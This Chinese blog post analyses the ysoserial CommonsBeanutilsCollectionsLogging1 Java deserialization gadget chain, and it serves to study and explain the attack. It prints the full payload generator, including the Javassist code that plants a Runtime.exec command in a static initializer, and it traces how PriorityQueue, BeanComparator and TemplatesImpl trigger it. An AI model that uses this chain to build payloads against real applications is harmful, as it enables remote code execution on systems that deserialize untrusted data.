---
layout: post
title: CommonsBeanutilsCollectionsLogging1分析
tags: [Java, Gadgets]
comment: false
---

## 0x00 CommonsBeanutilsCollectionsLogging1
依赖：
- commons-beanutils:1.9.2
- commons-collections:3.1
- commons-logging:1.2

ysoserial/payloads/CommonsBeanutilsCollectionsLogging1.java:
```java
public class CommonsBeanutilsCollectionsLogging1 implements ObjectPayload<Object> {

	public Object getObject(final String command) throws Exception {
		final TemplatesImpl templates = Gadgets.createTemplatesImpl(command);
		// mock method name until armed
		final BeanComparator comparator = new BeanComparator("lowestSetBit");

		// create queue with numbers and basic comparator
		final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
		// stub data for replacement later
		queue.add(new BigInteger("1"));
		queue.add(new BigInteger("1"));

		// switch method called by comparator
		Reflections.setFieldValue(comparator, "property", "outputProperties");

		// switch contents of queue
		final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
		queueArray[0] = templates;
		queueArray[1] = templates;

		return queue;
	}

	public static void main(final String[] args) throws Exception {
		PayloadRunner.run(CommonsBeanutilsCollectionsLogging1.class, args);
	}
}
```
Ysoserial 中每个 payload 的生成类都需要实现 ObjectPayload 接口中的 getObject 方法，该方法的功能为传入要执行的命令然后返回构造好的对象。
```java
final TemplatesImpl templates = Gadgets.createTemplatesImpl(command);
```
从第一句可以看出这里的命令执行需要用到 TemplatesImpl 中的执行链，之前 fastjson 反序列化的 POC 构造也是用的这个，具体可以看参考中的链接。

### 0x01 TemplatesImpl 中的执行链
com/sun/org/apache/xalan/internal/xsltc/trax/TemplatesImpl.java中的getOutputProperties():
```java
public synchronized Properties getOutputProperties() {
    try {
        return newTransformer().getOutputProperties();
    }
    catch (TransformerConfigurationException e) {
        return null;
    }
}
```
newTransformer():
```java
public synchronized Transformer newTransformer()
    throws TransformerConfigurationException
{
    TransformerImpl transformer;

    transformer = new TransformerImpl(getTransletInstance(), _outputProperties,
        _indentNumber, _tfactory);

    if (_uriResolver != null) {
        transformer.setURIResolver(_uriResolver);
    }

    if (_tfactory.getFeature(XMLConstants.FEATURE_SECURE_PROCESSING)) {
        transformer.setSecureProcessing(true);
    }
    return transformer;
}
```
getTransletInstance():
```java
private Translet getTransletInstance()
    throws TransformerConfigurationException {
    try {
        if (_name == null) return null;

        if (_class == null) defineTransletClasses();

        // The translet needs to keep a reference to all its auxiliary
        // class to prevent the GC from collecting them
        AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();
        translet.postInitialization();
        translet.setTemplates(this);
        translet.setServicesMechnism(_useServicesMechanism);
        translet.setAllowedProtocols(_accessExternalStylesheet);
        if (_auxClasses != null) {
            translet.setAuxiliaryClasses(_auxClasses);
        }

        return translet;
    }
    catch (InstantiationException e) {
        ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);
        throw new TransformerConfigurationException(err.toString());
    }
    catch (IllegalAccessException e) {
        ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);
        throw new TransformerConfigurationException(err.toString());
    }
}
```
其中的 defineTransletClasses 方法主要是通过 _bytecodes(存放着字节码)找到对应的 Class 并放到 _class 数组中去，接着会调用 Class 的 newInstance() 实例化。如此一来，只要在一个类中的初始块或者构造器中加入执行命令的代码，再把这个类的字节码传给 _bytecodes 就行。
完整的执行链:
getOutputProperties() --> newTransformer() --> getTransletInstance() --> newInstance()
根据这个执行链，只要找到一个在反序列化的时候会调用 TemplatesImpl.getOutputProperties() 就行，要注意的是这个执行链能执行到最终需要 _name，_bytecodes 和 _tfactory(在defineTransletClasses 方法中会用到)这三个变量不能为 null。

来看下 Ysoserial 是如何构造该执行链的。
ysoserial/payloads/util/Gadgets.java中的createTemplatesImpl():
```java
public static TemplatesImpl createTemplatesImpl(final String command) throws Exception {
	final TemplatesImpl templates = new TemplatesImpl();

	// use template gadget class
	ClassPool pool = ClassPool.getDefault();
	pool.insertClassPath(new ClassClassPath(StubTransletPayload.class));
	final CtClass clazz = pool.get(StubTransletPayload.class.getName());
	// run command in static initializer
	// TODO: could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections
	clazz.makeClassInitializer().insertAfter("java.lang.Runtime.getRuntime().exec(\"" + command.replaceAll("\"", "\\\"") +"\");");
	// sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)
	clazz.setName("ysoserial.Pwner" + System.nanoTime());

	final byte[] classBytes = clazz.toBytecode();

	// inject class bytes into instance
	Reflections.setFieldValue(templates, "_bytecodes", new byte[][] {
		classBytes,
		ClassFiles.classAsBytes(Foo.class)});

	// required to make TemplatesImpl happy
	Reflections.setFieldValue(templates, "_name", "Pwnr");
	Reflections.setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
	return templates;
}
```
这里主要是用到了 Javassist 这个库来处理字节码，这库厉害在于它可以在运行时动态的去修改 Java 的字节码。先是获得一个 ClassPool 对象，然后添加类的搜索路径。个人觉得 StubTransletPayload 这个类就定义在这里，添加这个搜索路径貌似作用不大。接下来就是获得 StubTransletPayload 类的 CtClass(compile-time clas)引用，然后就是往里面插入一段带有执行命令代码的静态初始化块。看下 StubTransletPayload :
```java
public static class StubTransletPayload extends AbstractTranslet implements Serializable {
	private static final long serialVersionUID = -5971610431559700674L;

	public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {}

	@Override
	public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {}
}
```
因为_bytecodes需要是translet class，这里是继承了AbstractTranslet这个抽象类。那么StubTransletPayload也得定义为抽象类，要不就得重写AbstractTranslet中的这两个方法，抽象类没法实例化，所以就只能选择去重写这两个方法了。
关于 Javassist 这个库的具体使用可以看参考里面的链接，本地写了一小段测试代码：
![](https://i.loli.net/2017/08/17/59950c4a17c10.png)
再看下生成的字节码和反编译的源码：
![](https://i.loli.net/2017/08/17/59950c67b9ee7.png)
设置 templates 中三个成员变量的值得时候用到了反射，Ysoserial 里自己写了个 Reflections 类，可以去看下:
```java
public class Reflections {
	public static Field getField(final Class<?> clazz, final String fieldName) throws Exception {
		Field field = clazz.getDeclaredField(fieldName);
		if (field == null && clazz.getSuperclass() != null) {
			field = getField(clazz.getSuperclass(), fieldName);
		}
		field.setAccessible(true);
		return field;
	}

	public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {
		final Field field = getField(obj.getClass(), fieldName);
		field.set(obj, value);
	}

	public static Object getFieldValue(final Object obj, final String fieldName) throws Exception {
		final Field field = getField(obj.getClass(), fieldName);		
		return field.get(obj);
	}

	public static Constructor<?> getFirstCtor(final String name) throws Exception {
		final Constructor<?> ctor = Class.forName(name).getDeclaredConstructors()[0];
	    ctor.setAccessible(true);
	    return ctor;
	}
}
```
对于这个类感觉要是知道反射怎么用的话都好理解。在 getField 方法中，要是当前类找不到还会去父类里面找，并且用了 setAccessible(true)来使得那些设置了 private 的成员变量也能访问到。
到这里就获取到了一个构造好的 TemplatesImpl 对象，就差 getOutputProperties()怎么被调用了。

### 0x02 利用链的构造
目前的理解是在 Java 中反序列化后能自动调用的就 readObject 方法，这里就用到了 PriorityQueue(优先级队列)类中重写的 readObject():
```java
private void readObject(java.io.ObjectInputStream s)
    throws java.io.IOException, ClassNotFoundException {
    // Read in size, and any hidden stuff
    s.defaultReadObject();

    // Read in (and discard) array length
    s.readInt();

    queue = new Object[size];

    // Read in all elements.
    for (int i = 0; i < size; i++)
        queue[i] = s.readObject();

    // Elements are guaranteed to be in "proper order", but the
    // spec has never explained what that might be.
    heapify();
}
```
反序列化后存到 queue 数组中，再进入heapif():
```java
private void heapify() {
    for (int i = (size >>> 1) - 1; i >= 0; i--)
        siftDown(i, (E) queue[i]);
}
```
这里应该做的是排序操作，往下再跟 siftDown()，siftDownUsingComparator():
```java
private void siftDown(int k, E x) {
    if (comparator != null)
        siftDownUsingComparator(k, x);
    else
        siftDownComparable(k, x);
}
```
```java
private void siftDownUsingComparator(int k, E x) {
    int half = size >>> 1;
    while (k < half) {
        int child = (k << 1) + 1;
        Object c = queue[child];
        int right = child + 1;
        if (right < size &&
            comparator.compare((E) c, (E) queue[right]) > 0)
            c = queue[child = right];
        if (comparator.compare(x, (E) c) <= 0)
            break;
        queue[k] = c;
        k = child;
    }
    queue[k] = x;
}
```
siftDownUsingComparator 方法才是这里的重点，这里将序列化后得到的对象传入了比较器 comparator 中的 compare 方法中去，在 CommonsBeanutilsCollectionsLogging1 中这个比较器用的是 BeanComparator:
```java
		final BeanComparator comparator = new BeanComparator("lowestSetBit");

		// create queue with numbers and basic comparator
		final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
```
去看下 BeanComparator(在commons-beanutils 包，同时需要用到 commons-collections 包中的ComparableComparator)中的 compare():
```java
public int compare( T o1, T o2 ) {

    if ( property == null ) {
        // compare the actual objects
        return internalCompare( o1, o2 );
    }

    try {
        Object value1 = PropertyUtils.getProperty( o1, property );
        Object value2 = PropertyUtils.getProperty( o2, property );
        return internalCompare( value1, value2 );
    }
    catch ( IllegalAccessException iae ) {
        throw new RuntimeException( "IllegalAccessException: " + iae.toString() );
    }
    catch ( InvocationTargetException ite ) {
        throw new RuntimeException( "InvocationTargetException: " + ite.toString() );
    }
    catch ( NoSuchMethodException nsme ) {
        throw new RuntimeException( "NoSuchMethodException: " + nsme.toString() );
    }
}
```
这里的关键在用 PropertyUtils.getProperty 来获取属性的值，比如这里它会去调用 o1.getProperty()，没有去跟它的具体实现了，但是可以用一小段代码来证明:
![](https://i.loli.net/2017/08/17/59950c77b3c82.png)
只要 o1 为 TemplatesImpl，property 为 outputProperties 就可以触发 TemplatesImpl.GetoutputProperties()从而执行命令。使用 PropertyUtils.getProperty 需要 commons-logging 包，不然会抛出异常。
接下来要做的就比较明确了，先添加正常的数据再通过反射去替换掉 queue 中的对象和 property，因为 PriorityQueue 不支持 non-comparable 对象，这里用到了 Java 的泛型的类型擦除。如果直接使用 queue.add 方法添加 template 会触发 Java 的 SecurityManager 安全机制，抛出异常:
```java
		// stub data for replacement later
		queue.add(new BigInteger("1"));
		queue.add(new BigInteger("1"));

		// switch method called by comparator
		Reflections.setFieldValue(comparator, "property", "outputProperties");

		// switch contents of queue
		final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
		queueArray[0] = templates;
		queueArray[1] = templates;

		return queue;
```

### 0x03 测试
![](https://i.loli.net/2017/08/17/59950c77cb15c.png)

### 参考
- https://drops.secquan.org/papers/14317
- http://blog.knownsec.com/2016/03/java-deserialization-commonsbeanutils-pop-chains-analysis/
- http://xxlegend.com/2017/04/29/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/
- http://jboss-javassist.github.io/javassist/tutorial/tutorial.html

